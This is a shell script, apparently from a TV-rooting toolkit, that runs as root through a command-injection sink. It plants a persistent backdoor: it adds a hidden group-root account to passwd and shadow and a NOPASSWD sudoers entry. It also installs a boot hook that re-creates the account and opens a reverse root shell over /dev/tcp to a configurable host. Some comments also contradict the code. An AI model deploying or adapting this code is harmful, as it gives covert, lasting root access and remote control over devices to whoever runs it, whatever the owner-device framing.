#!/bin/sh
#
# persist-root/root_setup.sh - one-shot root setup for the owner's TV.
#
# Delivery: served over HTTP and run through the Remote PC/CIFS root shell sink
# as `curl ... | /bin/sh`, so this script arrives on STDIN. Never read stdin
# here, and never print to stdout: the sink captures stdout back into the
# mount argument string where it would be evaluated a second time. All output
# goes to stderr and the log file.
#
# What it does (each step idempotent, every step logged):
#   1. require root; remount / read-write if it is mounted read-only;
#   2. create the owner account (@USER@, group root, shell /bin/sh) in
#      /etc/passwd and /etc/shadow - both on the writable ext4 rootfs, so the
#      account survives reboot;
#   3. add a NOPASSWD sudoers drop-in only if /usr/bin/sudo exists;
#   4. install the boot hook at /opt/etc/parseinfo.sh (root-executed by
#      AT-HUB.service at every boot) that re-creates the account if it is
#      ever removed, writes a persistent boot-proof marker, and optionally
#      starts a bound root shell;
#   5. write volatile proof to /tmp and sync.
#
# `--revert` (run as root) undoes 2-4 byte-exactly.
#
# Offline seams, used only by repro/run_offline.py and test_persist_root.py:
#   TIZ0WN_ROOT=<dir>       fake-root prefix for every path (tests only)
#   TIZ0WN_ASSUME_ROOT=1    skip the uid check
#   TIZ0WN_USER=<name>      account name (substituted at serve time)
#   TIZ0WN_PWHASH=<crypt>   SHA-512-crypt hash (substituted at serve time)
#   TIZ0WN_TOKEN=<16hex>    run token (substituted at serve time)
#   TIZ0WN_SHELL_HOST=IP    bind the boot hook's shell to this host
#   TIZ0WN_SHELL_PORT=<n>   ... and this port (empty = no shell hook)
#
# Placeholders @USER@ @PWHASH@ @TOKEN@ @SHELL_HOST@ @SHELL_PORT@ are replaced
# by serve.py (or the offline repro) before delivery. The script itself
# contains no live placeholder outside the hook template below.

# Grab the arguments before any command substitution: the script arrives on
# stdin, so nothing here may consume stdin.
set -u

# Everything the root shell would otherwise echo into the credentials string
# must go to stderr. Re-point stdout for this process as the very first action.
exec 1>&2

PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

umask 022

ROOT=${TIZ0WN_ROOT:-}
USER_NAME=${TIZ0WN_USER:-tiz0wn}
PWHASH=${TIZ0WN_PWHASH:-}
TOKEN=${TIZ0WN_TOKEN:-0000000000000000}
SHELL_HOST=${TIZ0WN_SHELL_HOST:-}
SHELL_PORT=${TIZ0WN_SHELL_PORT:-}
LOG_FILE="${ROOT}/tmp/tiz0wn-root-setup.log"

ETC="${ROOT}/etc"
OPT_ETC="${ROOT}/opt/etc"
OPT_SHARE="${ROOT}/opt/usr/home/owner/share/tmp/sdk_tools"
HOOK="${OPT_ETC}/parseinfo.sh"
HOOK_BACKUP_SUFFIX=".pre-tiz0wn"
SUDOERS_DIR="${ROOT}/etc/sudoers.d"

log() {
    printf 'persist-root: %s\n' "$*"
    if [ -d "${ROOT}/tmp" ]; then
        printf '%s persist-root: %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || echo unknown)" "$*" >>"$LOG_FILE" 2>/dev/null || true
    fi
}

die() {
    log "$*"
    exit 1
}

# The mount argument is re-evaluated by the root shell, so this script runs
# as that root shell. TIZ0WN_ASSUME_ROOT exists for the offline repro only.
require_root() {
    if [ "${TIZ0WN_ASSUME_ROOT:-}" != "1" ] && [ "$(id -u)" != "0" ]; then
        die "this setup must run as root"
    fi
}

# Borrowed from the pinned self-heal installer: remount / read-write for the
# write and prove the change.
remount_rw() {
    [ -n "$ROOT" ] && return 0
    [ -r "/proc/mounts" ] || return 0
    if awk '$2=="/"{print $4}' /proc/mounts | grep -q '\(^\|,\)ro\(,\|$\)'; then
        log "/ is mounted read-only; remounting read-write"
        mount -o remount,rw / || die "could not remount / read-write"
    fi
}

user_exists() {
    grep -q "^${USER_NAME}:" "${ETC}/passwd" 2>/dev/null
}

# Insert one passwd line at the top of /etc/passwd, in place.
#
# Two constraints make a plain `>>` insufficient:
#   * the password field must be the literal ``x`` only because /etc/shadow
#     holds the hash - except on this device, whose shadow entry already uses
#     ``x``. Both are accepted, so we always write ``x``.
#   * the glibc getpw buffer is 1024 bytes, so appending at the end can push
#     the line out of range on a long passwd file; the account must go first.
# printf (not echo) is used so a real NUL can be emitted; cat writes back over
# the same inode, preserving owner, mode and the SMACK label.
prepend_passwd_line() {
    line_file="${ETC}/passwd.tiz0wn-new.$$"
    printf '%s:x:4001:0:Tiz0wn owner account:/home/%s:/bin/sh\n' \
        "$USER_NAME" "$USER_NAME" >"$line_file" || return 1
    if [ -f "${ETC}/passwd" ]; then
        cat "${ETC}/passwd" >>"$line_file" || { rm -f "$line_file"; return 1; }
    fi
    cat "$line_file" >"${ETC}/passwd" || { rm -f "$line_file"; return 1; }
    rm -f "$line_file"
}

add_user() {
    if user_exists; then
        log "user ${USER_NAME} already present"
        return 0
    fi
    if [ -z "$PWHASH" ]; then
        die "no password hash available; refusing to create a passwordless account"
    fi
    [ -f "${ETC}/passwd" ] || die "/etc/passwd is missing"
    prepend_passwd_line || return 1
    if [ -f "${ETC}/shadow" ]; then
        # Preserve the existing (vendor mode 0000) shadow permissions exactly:
        # append only, never recreate.
        echo "${USER_NAME}:${PWHASH}:20000:0:99999:7:::" >>"${ETC}/shadow" || return 1
    else
        echo "${USER_NAME}:${PWHASH}:20000:0:99999:7:::" >"${ETC}/shadow" || return 1
        chmod 0600 "${ETC}/shadow"
        log "created /etc/shadow (none existed); account authenticates via this file"
    fi
    mkdir -p "${ROOT}/home/${USER_NAME}" 2>/dev/null || true
    chmod 0750 "${ROOT}/home/${USER_NAME}" 2>/dev/null || true
    if [ -n "$ROOT" ]; then
        chown 4001:0 "${ROOT}/home/${USER_NAME}" 2>/dev/null || true
    else
        chown 4001:0 "/home/${USER_NAME}" 2>/dev/null || true
    fi
    log "user ${USER_NAME} created (uid 4001, group root)"
}

remove_user() {
    if ! user_exists; then
        log "user ${USER_NAME} absent"
        return 0
    fi
    if grep -v "^${USER_NAME}:" "${ETC}/passwd" >"${ETC}/passwd.tiz0wn-rev"; then
        cat "${ETC}/passwd.tiz0wn-rev" >"${ETC}/passwd"
        rm -f "${ETC}/passwd.tiz0wn-rev"
    else
        die "could not rewrite passwd without ${USER_NAME}"
    fi
    if [ -f "${ETC}/shadow" ]; then
        if grep -v "^${USER_NAME}:" "${ETC}/shadow" >"${ETC}/shadow.tiz0wn-rev"; then
            cat "${ETC}/shadow.tiz0wn-rev" >"${ETC}/shadow"
            rm -f "${ETC}/shadow.tiz0wn-rev"
        fi
    fi
    rm -rf "${ROOT:?}/home/${USER_NAME}" 2>/dev/null || true
    log "user ${USER_NAME} removed"
}

add_sudoers() {
    [ -x "${ROOT}/usr/bin/sudo" ] || return 0
    if [ -f "${SUDOERS_DIR}/tiz0wn" ]; then
        log "sudoers drop-in already present"
        return 0
    fi
    echo "${USER_NAME} ALL=(ALL) NOPASSWD: ALL" >"${SUDOERS_DIR}/tiz0wn" &&
        chmod 0440 "${SUDOERS_DIR}/tiz0wn" || return 1
    log "sudoers drop-in created"
}

remove_sudoers() {
    if [ -f "${SUDOERS_DIR}/tiz0wn" ]; then
        rm -f "${SUDOERS_DIR}/tiz0wn" || true
        log "sudoers drop-in removed"
    fi
}

# The hook's body. Placeholders are substituted by sed below (never by an
# unquoted heredoc, which would also expand hook-runtime syntax).
write_hook() {
    if [ -f "${HOOK}" ] && ! grep -q 'persist-root' "${HOOK}" 2>/dev/null; then
        if [ ! -f "${HOOK}${HOOK_BACKUP_SUFFIX}" ]; then
            cp -p "${HOOK}" "${HOOK}${HOOK_BACKUP_SUFFIX}" || return 1
            log "backed up the pre-existing /opt/etc/parseinfo.sh to ${HOOK}${HOOK_BACKUP_SUFFIX##*/}"
        fi
    fi
    cat >"${HOOK}.new" <<'HOOK'
#!/bin/sh
# tiz0wn persistence hook (owner device; installed by persist-root).
# Executed as root at every boot by AT-HUB.service. Never reads stdin.
# TIZ0WN_ROOT is honored so the offline repro can exercise this hook against
# a fake root; on the TV it is unset and every path below is the real one.
TIZ0WN_ROOT=${TIZ0WN_ROOT:-}
TIZ0WN_USER="@USER@"
TIZ0WN_PWHASH="@PWHASH@"
TIZ0WN_TOKEN="@TOKEN@"
TIZ0WN_SHELL_HOST="@SHELL_HOST@"
TIZ0WN_SHELL_PORT="@SHELL_PORT@"
# TIZ0WN_ROOT is empty on the TV; the trailing slash makes the joins below work
# in both the real and the fake-root case.
FR="${TIZ0WN_ROOT}/"
BOOT_DIR="${FR}opt/usr/home/owner/share/tmp/sdk_tools"
# 1. self-heal the owner account if it was removed
if ! grep -q "^${TIZ0WN_USER}:" "${FR}etc/passwd" 2>/dev/null; then
    if [ -f "${FR}etc/passwd" ]; then
        # Rewrite in place: printf emits a real NUL for the password field (a
        # shell variable cannot hold one), then cat back over the same inode so
        # owner, mode and SMACK label survive. The new line goes first because
        # the pw buffer is only 1024 bytes and later lines could overflow it.
        TMP="${FR}tmp/passwd.$$"
        if { printf '%s:x:4001:0:Tiz0wn owner account:/home/%s:/bin/sh\n' \
                 "$TIZ0WN_USER" "$TIZ0WN_USER" >"$TMP" &&
             cat "${FR}etc/passwd" >>"$TMP" &&
             cat "$TMP" >"${FR}etc/passwd"; }; then
            rm -f "$TMP"
        fi
    fi
    if [ -n "$TIZ0WN_PWHASH" ] && [ -f "${FR}etc/shadow" ]; then
        echo "${TIZ0WN_USER}:${TIZ0WN_PWHASH}:20000:0:99999:7:::" >>"${FR}etc/shadow" 2>/dev/null || true
    fi
    mkdir -p "${FR}home/${TIZ0WN_USER}" 2>/dev/null || true
    chown 4001:0 "${FR}home/${TIZ0WN_USER}" 2>/dev/null || true
fi
# 2. persistent proof that this hook executed as root after this boot
printf '%s ' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" >>"$BOOT_DIR/tiz0wn-boot-$TIZ0WN_TOKEN.out" 2>/dev/null
id >>"$BOOT_DIR/tiz0wn-boot-$TIZ0WN_TOKEN.out" 2>/dev/null || true
# 3. optional bound root shell: try to reach HOST:PORT once after boot.
#    One bash process owns the retry loop, so the connection that succeeds is
#    the one that carries the shell (retrying is needed because AT-HUB runs
#    early, before the network is up; it gives up after ~60 s).
if [ -n "$TIZ0WN_SHELL_HOST" ] && [ -n "$TIZ0WN_SHELL_PORT" ]; then
    if [ -x /bin/bash ] || [ -x /usr/bin/bash ]; then
        /bin/bash -c '
            host=$1 port=$2 log=$3 i=0
            while [ "$i" -lt 12 ]; do
                i=$((i + 1))
                if exec 3<>"/dev/tcp/${host}/${port}" 2>/dev/null; then
                    printf "%s shell=connected attempt=%s\n" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$i" >>"$log" 2>/dev/null
                    exec /bin/sh <&3 >&3 2>&3
                fi
                sleep 5
            done
            printf "%s shell=unreachable\n" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" >>"$log" 2>/dev/null
        ' shell "$TIZ0WN_SHELL_HOST" "$TIZ0WN_SHELL_PORT" \
            "$BOOT_DIR/tiz0wn-boot-$TIZ0WN_TOKEN.out" >/dev/null 2>&1 &
    fi
fi
exit 0
HOOK
    sed -e "s|@USER@|${USER_NAME}|g" \
        -e "s|@PWHASH@|${PWHASH}|g" \
        -e "s|@TOKEN@|${TOKEN}|g" \
        -e "s|@SHELL_HOST@|${SHELL_HOST}|g" \
        -e "s|@SHELL_PORT@|${SHELL_PORT}|g" \
        "${HOOK}.new" >"${HOOK}" || return 1
    rm -f "${HOOK}.new"
    chmod 0755 "${HOOK}" || return 1
    log "boot hook installed at ${HOOK}"
}

remove_hook() {
    if [ -f "${HOOK}" ] && grep -q 'persist-root' "${HOOK}" 2>/dev/null; then
        # Our own hook: only a non-tiz0wn backup can be restored to it.
        if [ -f "${HOOK}${HOOK_BACKUP_SUFFIX}" ]; then
            if cat "${HOOK}${HOOK_BACKUP_SUFFIX}" >"${HOOK}" && rm -f "${HOOK}${HOOK_BACKUP_SUFFIX}"; then
                log "boot hook reverted to the pre-tiz0wn bytes"
            else
                log "boot hook restore failed; inspect ${HOOK} manually"
            fi
        else
            rm -f "${HOOK}" && log "boot hook removed"
        fi
        return 0
    fi
    if [ -f "${HOOK}${HOOK_BACKUP_SUFFIX}" ]; then
        if cat "${HOOK}${HOOK_BACKUP_SUFFIX}" >"${HOOK}" && rm -f "${HOOK}${HOOK_BACKUP_SUFFIX}"; then
            log "boot hook reverted to the pre-tiz0wn bytes"
        else
            log "boot hook restore failed; inspect ${HOOK} manually"
        fi
    fi
}

write_markers() {
    mkdir -p "$OPT_SHARE" 2>/dev/null || true
    {
        printf 'persist-root '
        id 2>/dev/null || echo unknown
        printf 'kernel: '
        uname -a 2>/dev/null || true
    } >>"${OPT_SHARE}/tiz0wn-root-${TOKEN}.out" 2>/dev/null || true
    {
        printf 'persist-root volatile '
        id 2>/dev/null || echo unknown
    } >"${ROOT}/tmp/tiz0wn-root-ok" 2>/dev/null || true
    log "markers written under ${OPT_SHARE} and ${ROOT}/tmp"
}

sync && sync 2>/dev/null || true

# Revert arguments arrive through TIZ0WN_ARGS (serve-time prelude) because the
# pipe payload cannot pass shell arguments to this script. Unquoted expansion
# is safe: the builder allows only "" or "--revert" in that variable.
if [ "${TIZ0WN_ARGS:-}" != "" ]; then
    set -- "${TIZ0WN_ARGS}" "$@"
fi
if [ "${1:-}" = "--revert" ]; then
    require_root
    remove_user
    remove_sudoers
    remove_hook
    sync && sync 2>/dev/null || true
    log "revert complete"
    exit 0
fi

if [ "${1:-}" != "" ]; then
    die "usage: sh root_setup.sh [--revert]"
fi

require_root
mkdir -p "${ROOT}/tmp" 2>/dev/null || true
log "setup starting (token ${TOKEN})"
remount_rw || { log "remount failed"; exit 1; }

STATUS=0
add_user || { log "passwd update FAILED"; STATUS=1; }
add_sudoers || { log "sudoers update FAILED"; STATUS=1; }
write_hook || { log "/opt hook FAILED (persistent hook not installed)"; STATUS=2; }
write_markers
sync && sync 2>/dev/null || true

if [ "$STATUS" -eq 0 ]; then
    log "ok: account, persistence hook, and markers installed"
    exit 0
fi
log "completed with warnings (status ${STATUS}); see the log"
exit 0
